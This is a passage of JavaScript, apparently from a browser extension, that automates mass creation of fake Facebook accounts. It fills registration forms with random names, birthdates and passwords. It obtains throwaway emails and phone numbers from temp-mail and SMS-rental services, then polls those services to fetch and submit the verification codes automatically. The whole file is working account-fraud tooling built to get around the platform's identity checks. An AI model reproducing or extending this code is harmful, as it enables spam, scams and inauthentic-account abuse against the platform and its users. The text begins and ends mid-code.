 };
}
 // crete not konfirm nomre
 if(service_mail==9){
  //reg !    
  if(window.ArezDev_Settings.jeneng_indo){
    chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
      var Fn = jeneng.split("|")[0];
      var Ln = jeneng.split("|")[1];
      reg(Fn,Ln,window.ArezDev_Settings.daftarNoverify_Nomer_Awal+arezdev.randInt(1111111111, 9999999999));
    });
  }
  if(window.ArezDev_Settings.jeneng_bule){
    chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Full"},(jeneng)=>{
      var Fn = jeneng.split(" ")[0];
      var Ln = jeneng.split(" ")[1];
      reg(Fn,Ln,window.ArezDev_Settings.daftarNoverify_Nomer_Awal+arezdev.randInt(1111111111, 9999999999));
    });
  }
 }
 if(service_mail==10){
  chrome.runtime.sendMessage({
    action:"ajax",
    url:"https://tokoclaude.com/api/set-orders/7df10d3d721ca64ed198a711ea2b1e6d/3",
    method:"GET"},(a)=>{
      console.log(a);
      chrome.runtime.sendMessage({action:"SAVE",key:"order_tokoclaude",value:a.data.data.order_id});
      if(window.ArezDev_Settings.jeneng_indo){
        chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
          var Fn = jeneng.split("|")[0];
          var Ln = jeneng.split("|")[1];
          reg(Fn,Ln,a.data.data.number);
        });
      }
      if(window.ArezDev_Settings.jeneng_bule){
        chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Full"},(jeneng)=>{
          var Fn = jeneng.split(" ")[0];
          var Ln = jeneng.split(" ")[1];
          reg(Fn,Ln,a.data.data.number);
        });
      }
    });
 }
// cret 5sim
if(service_mail==0){
  chrome.runtime.sendMessage({create:"5sim"},(nomer)=>{
    if(nomer){
      chrome.runtime.sendMessage({action:"SAVE",key:"id_5SIM",value:nomer.id});
	  chrome.runtime.sendMessage({action:"SAVE", key: "5SIM_ArezDev", value:nomer.phone});
    //reg !    
    if(window.ArezDev_Settings.jeneng_indo){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,nomer.phone);
      });
    }
    if(window.ArezDev_Settings.jeneng_bule){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Full"},(jeneng)=>{
        var Fn = jeneng.split(" ")[0];
        var Ln = jeneng.split(" ")[1];
        reg(Fn,Ln,nomer.phone);
      });
    }
    }
   }); //GET
 }
//============================== email area ==============================//
})//get names
 });

 } //window.location = reg
 //============================== change email area ==============================//
 else if(window.location.href.match(/changeemail/)){
  chrome.runtime.sendMessage({get:"daftar"},(service_mail)=>{
  if(service_mail==1){
    chrome.runtime.sendMessage({action:"LOAD",key:"Gmail_ArezDev"},function(gmail_arezdev){
      setTimeout(function(){ get_kode_Gmail() },1000);
      setTimeout(function(){try {$("[name=new]").val(gmail_arezdev)}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
  } else if(service_mail==2){
    chrome.runtime.sendMessage({action:"LOAD",key:"TempMailorg_ArezDev"},function(temporg){
      setTimeout(function(){ getKode_tempmailorg() },1000);
      setTimeout(function(){try {$("[name=new]").val(temporg.split("|")[0])}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
  } else if(service_mail==3){
    chrome.runtime.sendMessage({action:"LOAD",key:"HotmailBox_ArezDev"},function(hotmail){
      setTimeout(function(){ getKodeHotmailbox() },1000);
      setTimeout(function(){try {$("[name=new]").val(hotmail.split("|")[0])}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
  } else if(service_mail==4){
    chrome.runtime.sendMessage({action:"LOAD",key:"Dichvugmail_Email_ArezDev"},function(gmail_arezdev){
      setTimeout(function(){ getKodeDichvugmail() },1000);
      setTimeout(function(){try {$("[name=new]").val(gmail_arezdev)}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
  } else if(service_mail==5){
    chrome.runtime.sendMessage({action:"LOAD",key:"MailTM_data_ArezDev"},function(email){
      setTimeout(function(){ get_kode_mailtm() },1000);
      setTimeout(function(){try {$("[name=new]").val(email)}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
  } else if(service_mail==6){
    var get10MinuteMail = setInterval(() => {
      chrome.runtime.sendMessage({email:"10Minutemail",path:"/address.api.php?new=1"},(b)=>{
        console.log(b);
        if(b.mail_get_mail.match(/zbock/)){
  
        }else{
          clearInterval(get10MinuteMail)
          //reg
    chrome.runtime.sendMessage({action:"SAVE", key: "10MinuteMail_data_ArezDev", value:b.mail_get_mail});
    if(window.ArezDev_Settings.jeneng_indo){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,b.mail_get_mail);
      });
    }
    if(window.ArezDev_Settings.jeneng_bule){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,b.mail_get_mail);
      });
    }
    chrome.runtime.sendMessage({action:"LOAD",key:"10MinuteMail_data_ArezDev"},function(email){
      setTimeout(function(){ get_kode_10Minute() },1000);
      setTimeout(function(){try {$("[name=new]").val(email)}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
        } //if email
      })//emails
    }, 5000);
  } else if(service_mail==7){
    chrome.runtime.sendMessage({action:"LOAD",key:"TempmailLol_data_ArezDev"},function(email){
      setTimeout(function(){ konfirm_TempmailLOL() },1000);
      setTimeout(function(){try {$("[name=new]").val(email)}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
  } else if(service_mail==8){
    chrome.runtime.sendMessage({action:"LOAD",key:"GeneratorMail_data_ArezDev"},function(email){
      setTimeout(function(){ konfirm_generatordotmail() },1000);
      setTimeout(function(){try {$("[name=new]").val(email)}catch(_){} },2000)
      setTimeout(function(){try{$("[name=submit]").click()}catch(_){} },5000)
    })
    }
  }); //get daftar
 }
}); //end of Global skrip
},1000);
//============================== change email area ==============================//

//============================== reg area ==============================//

function reg(jeneng_ngarep = "", jeneng_nguri = "", email = ""){
  chrome.runtime.sendMessage({action:"SAVE", key: "PassRandom", value: arezdev.randStr(9)});
       //setting gender Random!
       if(window.ArezDev_Settings.daftarGenderRandom){
        var xx = [0,1];
        var xxx = Math.floor(Math.random() * xx.length);
        window.ArezDev_Settings.daftarGender=xx[xxx];
        }
  if(window.ArezDev_Settings.jeneng_soket){
	  
	/* setTimeout(() => {
      document.getElementsByName("age_step_input")[0].value=arezdev.randInt(17,23);
    }, window.ArezDev_Settings.delay_isi_Usia * 1000);
	setTimeout(() => {
      document.getElementsByClassName("_603e _1aex")[0].click();
    }, window.ArezDev_Settings.delay_Btn_Usia * 1000); */

    setTimeout(() => {
      document.getElementsByName("birthday_date")[0].value=arezdev.randInt(1,28)+"/"+arezdev.randInt(1,12)+"/"+arezdev.randInt(1999,2005);
    }, window.ArezDev_Settings.delay_isi_Usia * 1000);
	
  }else{
	  
    setTimeout(() => {
				if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.facebook.com/)){
				   document.getElementsByName("firstname")[0].value=jeneng_ngarep.toLocaleLowerCase(); //  + " " + jeneng_nguri;
				} else {
					document.getElementsByName("firstname")[0].value=jeneng_ngarep.toLocaleLowerCase()  + " " + jeneng_nguri.toLocaleLowerCase();
				}		
    }, window.ArezDev_Settings.delay_isi_NamaDepan * 1000);
	setTimeout(() => {
        document.getElementsByName("lastname")[0].value=jeneng_nguri;
    }, window.ArezDev_Settings.delay_isi_NamaBelakang * 1000);
    setTimeout(() => {
      if(window.ArezDev_Settings.daftar_web){
        document.getElementsByName("lastname")[0].value=jeneng_nguri;
      }
    }, window.ArezDev_Settings.delay_isi_NamaBelakang * 1000);
	setTimeout(() => {
      document.getElementsByName("birthday_date")[0].value=arezdev.randInt(1,28)+"/"+arezdev.randInt(1,12)+"/"+arezdev.randInt(1999,2005);
    }, window.ArezDev_Settings.delay_isi_Usia * 1000);
	
  }
  if(window.ArezDev_Settings.change_email){
    if(window.ArezDev_Settings.daftarNoverify_Email){
      if(window.ArezDev_Settings.jeneng_soket){
        chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Soket"},(jeneng)=>{
          setTimeout(() => {
            document.getElementsByName("reg_email__")[0].value=jeneng.split("|")[0]+jeneng.split("|")[1]+arezdev.randInt(1111,9999)+"@"+window.ArezDev_Settings.daftarNoverify_Email_Domain;
          }, window.ArezDev_Settings.delay_isi_EmailNomer * 1000);
        })
      } else {
        setTimeout(() => {
          document.getElementsByName("reg_email__")[0].value=jeneng_ngarep+jeneng_nguri+arezdev.randInt(1111,9999)+"@"+window.ArezDev_Settings.daftarNoverify_Email_Domain;
        }, window.ArezDev_Settings.delay_isi_EmailNomer * 1000);
      }
    }
    if(window.ArezDev_Settings.daftarNoverify_Nomer){
      setTimeout(() => {
        document.getElementsByName("reg_email__")[0].value=window.ArezDev_Settings.daftarNoverify_Nomer_Awal+arezdev.randInt(1111111, 9999999);
      }, window.ArezDev_Settings.delay_isi_EmailNomer * 1000);
    }
  } else {
    setTimeout(() => { document.getElementsByName("reg_email__")[0].value=email; }, window.ArezDev_Settings.delay_isi_EmailNomer * 1000);
    }
    setTimeout(() => {
      try{document.querySelector("[type=radio]")&&$("[type=radio]").eq(window.ArezDev_Settings.daftarGender).prop("checked",true)}catch(_){}
    }, window.ArezDev_Settings.delay_isi_JenisKelamin * 1000);
    setTimeout(() => {
      document.getElementById("day").value=arezdev.randInt(1,28);
    }, window.ArezDev_Settings.delay_isi_TglLahir * 1000);
    setTimeout(() => {
      document.getElementById("month").value=arezdev.randInt(1,12);
    }, window.ArezDev_Settings.delay_isi_BulanLahir * 1000);
    setTimeout(() => {
      document.getElementById("year").value=arezdev.randInt(1980,1999);
    }, window.ArezDev_Settings.delay_isi_TahunLahir * 1000);
    setTimeout(() => {
      if(window.ArezDev_Settings.pass_mode){
        document.getElementsByName("reg_passwd__")[0].value=window.ArezDev_Settings.pass_gawedaftar;

        //document.getElementsByName("reg_passwd__")[0].value=jeneng_ngarep+arezdev.randInt(666,777);

      }
      else {
        chrome.runtime.sendMessage({action:"LOAD", key: "PassRandom"},(pass)=>{
        document.getElementsByName("reg_passwd__")[0].value=pass;
        })
      }
    }, window.ArezDev_Settings.delay_isi_Password * 1000);
/*     if(window.ArezDev_Settings.daftar_m){
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_1 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_2 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_3 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_4 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_5 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_6 * 1000);
    }
    if(window.ArezDev_Settings.daftar_free){
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_free * 1000);
    }
    if(window.ArezDev_Settings.daftar_web){
      setTimeout(function(){ try { $('[name=websubmit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_web * 1000);
    } */
	if(window.location.href.match(/m.facebook.com|mobile.facebook.com|m.prod.facebook.com/)){
		console.log("daftar m");
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_1 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_2 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_3 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_4 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_5 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_6 * 1000);
    }
    if(window.location.href.match(/free.facebook.com/)){
		console.log("daftar free");
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_free * 1000);
    }
    if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.prod.facebook.com|www.facebook.com/)){
		console.log("daftar web");
      setTimeout(function(){ try { $('[name=websubmit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_web * 1000);
    }
}
//============================== reg area ==============================//

//============================== konfirmasi area ==============================//

function konfirm_generatordotmail(){
var NjupokCode = setInterval(() => {
  chrome.runtime.sendMessage({action:"LOAD", key: "GeneratorMail_data_ArezDev"},(emailku)=>{
    chrome.runtime.sendMessage({
      "action":"ajax",
      "url":"https://tempm.com/"+emailku,
      "method":"GET",
    },function(b){
      if(b){
        var c=b.match(/<td\b[^>]*>(\d+)<\/td>/i);
        if(c&&c[1]){
          clearInterval(NjupokCode);            
          $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>Kode wes teko!!.........</div>");
          console.log(c[1])
          if(window.ArezDev_Settings.daftar_mode){
            setTimeout(function(){ 
              const kode = document.getElementsByName("code")[0];
              kode.value=c[1];
              kode.dispatchEvent(new Event('input', {'bubbles': true}));
              },5000);
              setTimeout(function(){document.getElementsByName("confirm")[0].click()},9000);
              setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
            } else {
              setTimeout(function(){ document.getElementsByName("c")[0].value=c[1] },5000);
              if(window.ArezDev_Settings.daftar_free){
                setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },7000);
                setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },9000);
              } else {
                setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },7000);
              }
            }
        }else{
          var c=b.match(/FB-(\d+)/i);
          if(c&&c[1]){
            clearInterval(NjupokCode);
            $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>Kode wes teko!!.........</div>");
            console.log(c[1])}
            if(window.ArezDev_Settings.daftar_mode){
              setTimeout(function(){ 
                const kode = document.getElementsByName("code")[0];
                kode.value=c[1];
                kode.dispatchEvent(new Event('input', {'bubbles': true}));
                },5000);
                setTimeout(function(){document.getElementsByName("confirm")[0].click()},9000);
                setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
              } else {
                setTimeout(function(){ document.getElementsByName("c")[0].value=c[1] },5000);
                if(window.ArezDev_Settings.daftar_free){
                  setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },7000);
                  setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },9000);
                } else {
                  setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },7000);
                }
			        }
          }
        }
      })
    })
}, 9000);  
}

function konfirm_TempmailLOL(){
  var ngonfirmasi = setInterval(() => {
      chrome.runtime.sendMessage({action:"LOAD", key:"Token_TempmailLol_data_ArezDev"},(token)=>{
      chrome.runtime.sendMessage({konfirm:"tempmailol", auth:token},(code)=>{
        console.log(code.email[0].body);
        console.log(code.email[0].body.split("\n")[2]);
        var url_konfirmasi = code.email[0].body.split("\n")[2];
        var kode_konfirmasi = code.email[0].body.split("\n")[2].split("&c=")[1].split("&cuid=")[0];
        if(kode_konfirmasi){
          clearInterval(ngonfirmasi);
          $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;right:0px;'>KODE READY !!</div>");
          if(window.ArezDev_Settings.daftar_mode){
            setTimeout(function(){ 
              const kode = document.getElementsByName("code")[0];
              kode.value=kode_konfirmasi;
              kode.dispatchEvent(new Event('input', {'bubbles': true}));
              },5000);
                  setTimeout(function(){ 
              document.getElementsByName("confirm")[0].click() 
              },9000);
              setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
            } else {
              setTimeout(function(){ document.getElementsByName("c")[0].value=kode_konfirmasi },5000);
              if(window.ArezDev_Settings.daftar_free){
                setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },7000);
              } else {
                setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },7000);
              }
            }
        }
      }); //get emails
    }); //Load tokens
  }, 9500);
}

function get_kode_10Minute(){
  var getotp=setInterval(() => {
    chrome.runtime.sendMessage({email:"10Minutemail", path:"/address.api.php"},(code)=>{
      console.log(code);
      if(code&&code.mail_list){
        for(var codes in code.mail_list){
        var isine = code.mail_list[codes];
        var isi_code =[];
        for(var hasile in isine){
          isi_code.push(isine[hasile]);
          }
          //console.log(isine)
      if(isine.from.match("registration")){   
        $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>KODE READY !!</div>");
        clearInterval(getotp);
          console.log(isine.mail_id);
          chrome.runtime.sendMessage({email:"10Minutemail", path:"/mail.api.php?mailid="+isine.mail_id},(codes)=>{
            var url_confirm = codes.urls[0]; //.split("https://www")[1];
            var kode_confirm = codes.urls[0].split("&c=")[1].split("&cuid=")[0];
            var code_10mnt = codes.header_decode.subject.match(/FB-(\d+)/)[1];
            chrome.runtime.sendMessage({action:"SAVE",key:"KODE_10Minute",value:code_10mnt});
            if(window.location.href.match(/www.facebook.com|pixel.facebook.com|web.facebook.com|web.prod.facebook.com/)){
              //setTimeout(()=>{ window.location.replace(url_confirm) },4000);
                if(window.ArezDev_Settings.ModeVerify){
                  setTimeout(function(){ 
                    const kode = document.getElementsByName("code")[0];
                    kode.value=code_10mnt;
                    kode.dispatchEvent(new Event('input', {'bubbles': true}));
                    },5000);
                        setTimeout(function(){ 
                    document.getElementsByName("confirm")[0].click() 
                    },9000);
                    setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
                } else {
                  arezdevCookie();
                }
              } else {
		          // setTimeout(()=>{window.location.replace(url_confirm)},4000);  
                if(window.ArezDev_Settings.ModeVerify){
                  setTimeout(function(){ document.getElementsByName("c")[0].value=code_10mnt },5000);
                  setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },7000);
                  setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },7000);
                } else {
                  arezdevCookie();
                }
			        }
            console.log(url_confirm);
          })
        }
       }
      }
    })
  }, 9000);

}

function get_kode_mailtm(){
var getmailTM = setTimeout(() => {
  chrome.runtime.sendMessage({action:"LOAD", key: "MailTM_data_ArezDev"},(email)=>{
    chrome.runtime.sendMessage({
      email:"mailtm",
      path:"token",
      body:"{\"address\": \""+email+"\",\"password\":\"S1WAL4N\"}"
    },(b)=>{
      console.log(b);
      if(b.token){
        fetch("https://api.mail.tm/messages",{
          "headers":{
            "content-type": "application/ld+json",
            "authorization": "Bearer "+b.token
          }
        }).then(async(r)=>{
          try {
            const d = await r.json();
            console.log(d);
            console.log(d["hydra:member"][0].subject);
            if(d["hydra:member"][0].subject){   
              clearInterval(getmailTM)     
              $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>KODE READY !!</div>");
              if(window.ArezDev_Settings.daftar_mode){
              setTimeout(function(){ 
                const kode = document.getElementsByName("code")[0];
                kode.value=d["hydra:member"][0].subject.split("FB-")[1].split(" adalah kode konfirmasi Facebook Anda")[0];
                kode.dispatchEvent(new Event('input', {'bubbles': true}));
                },5000);
                    setTimeout(function(){ 
                document.getElementsByName("confirm")[0].click() 
                },9000);
                setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
              } else {
                setTimeout(function(){ document.getElementsByName("c")[0].value=d["hydra:member"][0].subject.split("FB-")[1].split(" adalah kode konfirmasi Facebook Anda")[0]; },5000);
                if(window.ArezDev_Settings.daftar_free){
                  setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },7000);
                } else {
                  setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },7000);
                }
              }
            }
          } catch (error) {
            console.log(error);
          }
        })
      }
    });
  });
}, 9000);
}

function getKodeDichvugmail(){
  var getdichvumail = setInterval(()=>{
  chrome.runtime.sendMessage({action:"LOAD", key: "Dichvugmail_ID_ArezDev"},(id)=>{
    chrome.runtime.sendMessage({email:"dichvu",apiKey:window.ArezDev_Settings.apikey_dichvugmail,path:id},(code)=>{
      if(code.orders.otp){
        clearInterval(getdichvumail);      
		$("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>Kode READY!!.........</div>");
        if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.facebook.com/)){
          setTimeout(function(){ 
            $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>KODE READY !!</div>");
            const kode = document.getElementsByName("code")[0];
            kode.value=code.orders.otp;
            kode.dispatchEvent(new Event('input', {'bubbles': true}));
            },5000);
                setTimeout(function(){ 
            document.getElementsByName("confirm")[0].click() 
            },9000);
            setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
          } else {
              setTimeout(function(){ document.getElementsByName("c")[0].value=code.orders.otp; },5000);
              setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },7000);
              setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[1].click(); },7000);
        }
      } 
    })
  })
  },9000);
}

function getKodeHotmailbox(){
  var getHotmailboxCode = setInterval(function(){
  chrome.runtime.sendMessage({action:"LOAD", key: "HotmailBox_ArezDev"}, function(em){
  fetch("https://getcode.hotmailbox.me/facebook?email="+em.split("|")[0]+"&password="+em.split("|")[1]+"&timeout=5")
  .then(async (response) => {
    try {
      const data = await response.json();
      console.log(data);
      if(data.VerificationCode){       
        //save kode!
        chrome.runtime.sendMessage({action:"SAVE",key:"HOTMAILBOX",value:data.VerificationCode})    
        $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>KODE READY !!</div>");
        clearInterval(getHotmailboxCode);
        if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.facebook.com/)){
          // setTimeout(function(){ 
            // const kode = document.getElementsByName("code")[0];
            // kode.value=data.VerificationCode;
            // kode.dispatchEvent(new Event('input', {'bubbles': true}));
            // },5000);
                // setTimeout(function(){ 
            // document.getElementsByName("confirm")[0].click() 
            // },9000);
            // setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
			
           var Link_Confirm = data.MailBody;
            console.log(Link_Confirm.split("\r\n")[2]);
            setTimeout(() => {
             window.location.replace(Link_Confirm.split("\r\n")[2]);
              window.location.replace(Link_Confirm.split("\r\n")[2]);
            }, 3000);
			
		  } else {
            var Link_Confirm = data.MailBody;
            console.log(Link_Confirm.split("\r\n")[2]);
            setTimeout(() => {
              //window.location.replace(Link_Confirm.split("\r\n")[2]);
            }, 3000);            
			  setTimeout(function(){ document.getElementsByName("c")[0].value=data.VerificationCode; },2000);
              setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },4000);
              setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },6000);
        }
      }
    } catch (err) {
      console.log(err);
    }
    }) //getKode
  }) //Load email
},9000)
}

function getKode_tempmailorg(){
 var getMail = setInterval(function(){
  chrome.runtime.sendMessage({action:"LOAD", key: "TempMailorg_ArezDev"}, function(data){
                chrome.runtime.sendMessage({
                  "action":"ajax",
                   "url":"https://web2.temp-mail.org/messages",
                   "method":"GET",
                   "type":"json",
                   "headers":{"authorization": "Bearer " + data.split("|")[1] + ""},
                 },function(a){
                  console.log(a)
                  for(var imelkuy in a.messages){
                    var isine = a.messages[imelkuy];
                    var metuo =[];
                    for(var hasile in isine){
                    metuo.push(isine[hasile]);
                  }
                  if(isine.from.match("registration")){
                    var idpesan = isine._id;
                    clearInterval(getMail);
                    chrome.runtime.sendMessage({
                      "action":"ajax",
                       "url":"https://web2.temp-mail.org/messages/"+ idpesan +"",
                       "method":"GET",
                       "type":"json",
                       "headers":{"authorization": "Bearer " + data.split("|")[1] + ""},
                     },function(b){
                     if(b){
                      $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>Wes dadi FB !!</div>");
                      console.log(b)
                       var c = arezdev.html.decode(b.bodyHtml)
                       var d=arezdev.html.links(c);
                       var e = d.data[2].props.split('href="')[1]
                       var f = e.split('" style="color:#1b74e4;text-decoration:none;"')[0]
                      console.log("links: "+f)
                      var kodeC = b.bodyHtml.split("&amp;cuid=")[0].split("&amp;c=")[1];      
                      //save kode!
                      chrome.runtime.sendMessage({action:"SAVE",key:"KODE_TEMP_MAIL_ORG",value:kodeC})
                      console.log("kode: "+kodeC)
                      if(window.ArezDev_Settings.ModeVerify){      
                        if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.facebook.com/)){
                        setTimeout(function(){ 
                          const kode = document.getElementsByName("code")[0];
                          kode.value=kodeC;
                          kode.dispatchEvent(new Event('input', {'bubbles': true}));
                          },5000);
                              setTimeout(function(){ 
                          document.getElementsByName("confirm")[0].click() 
                          },9000);
                          setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
                            } else {
                              setTimeout(function(){ document.getElementsByName("c")[0].value=kodeC; },5000);
                                setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },7000);                                
								setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },9000);
                          } 
                      } else {
                          arezdevCookie()
                        }
                       }
                    })
                   }
                  }
                  console.log(metuo)
                  console.log(isine)
                 })                 
              })
             },9000)  
            }

function get_kode_Gmail(){

 var getOTPgm = setInterval(function(){
  chrome.runtime.sendMessage({action:"LOAD",key:"Gmail_ArezDev"},function(gmail_arezdev){
  chrome.runtime.sendMessage({
    "action":"ajax",
    "url":"http://sellgmail.com/api/mailselling/get-mail-otp?mail="+ gmail_arezdev +"&serviceId=4&apiKey="+window.ArezDev_Settings.apikey_sellgmail,
    "method":"GET",
  },function(a){
    if(a&&a.data.otp){
      clearInterval(getOTPgm);
      $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;right:0px;'>Kode wes teko!!.........</div>");
      //save kode!
      chrome.runtime.sendMessage({action:"SAVE",key:"KODE_GMAIL",value:a.data.otp});

      if(window.ArezDev_Settings.ModeVerify){
        if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.facebook.com/)){
          setTimeout(function(){ 
            const kode = document.getElementsByName("code")[0];
            kode.value=a.data.otp;
            kode.dispatchEvent(new Event('input', {'bubbles': true}));
            },5000);
                setTimeout(function(){ 
            document.getElementsByName("confirm")[0].click() 
            },9000);
            setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
              } else {
                setTimeout(function(){ document.getElementsByName("c")[0].value=a.data.otp; },5000);
                  setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },76000);
                  setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[1].click(); },9000);
            }
      }
      else {
        setTimeout(function(){ arezdevCookie() },6000);
      }

       } //if emails
    }) //Get kode
   }) //Get Email
  },9000)
}
function get_code_5SIM(){
  var getCode = setInterval(() => {
    chrome.runtime.sendMessage({action:"LOAD",key:"id_5SIM"},(id)=>{
      chrome.runtime.sendMessage({getcode:"5sim",id:id},(inbox)=>{
        if(inbox.sms[0].code){
          clearInterval(getCode);
          if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.facebook.com/)){
            setTimeout(function(){ 
              const kode = document.getElementsByName("code")[0];
              kode.value=inbox.sms[0].code;
              kode.dispatchEvent(new Event('input', {'bubbles': true}));
              },5000);
                  setTimeout(function(){ 
              document.getElementsByName("confirm")[0].click() 
              },9000);
              setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
                } else {
                    setTimeout(function(){ document.getElementsByName("c")[0].value=inbox.sms[0].code; },5000);
                    setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },6000);
